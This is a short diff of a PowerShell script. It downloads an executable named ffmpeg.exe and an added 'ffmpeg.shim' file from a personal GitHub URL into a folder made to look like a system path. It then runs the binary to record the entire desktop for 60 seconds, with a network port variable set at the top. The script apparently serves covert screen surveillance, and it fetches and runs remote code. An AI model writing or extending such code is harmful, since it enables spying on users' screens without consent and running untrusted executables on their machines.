@@ -21,7 +21,11 @@ $Port = "1234"
 
 $url = "https://raw.githubusercontent.com/wajih8/wpla_wajih/refs/heads/main/public/ffmpeg.exe"
 $outPath = "C:\ProgramX64\extentions\ffmpeg.exe"
+$url2 = "https://raw.githubusercontent.com/wajih8/wpla_wajih/refs/heads/main/public/ffmpeg.shim"
+$outPath2 = "C:\ProgramX64\extentions\ffmpeg.shim"
 Invoke-WebRequest -Uri $url -OutFile $outPath
+Start-Sleep -Milliseconds 20
+Invoke-WebRequest -Uri $url2 -OutFile $outPath2
 Start-Sleep -Milliseconds 20
 C:\ProgramX64\extentions\ffmpeg.exe -f gdigrab -framerate 25 -i desktop `
     -t 60 `
